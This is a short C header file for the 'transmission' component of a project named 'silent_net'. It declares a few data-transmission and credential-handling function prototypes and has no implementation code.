/*
 *	'silent_net' tranmission.h - header file for tranmission
 *
 *	Omer Kfir (C)
 */

#ifndef TRANSMISSION_H
#define TRANSMISSION_H

#include "headers.h"
#include "mac_find.h"
#include "protocol.h"
#include "tcp_socket.h"
#include "workqueue.h"

void transmit_data(struct work_struct *);
void handle_credentials(void);
void data_transmission_init(void);
void data_transmission_release(void);

/* TRANSMISSION_H */
#endif
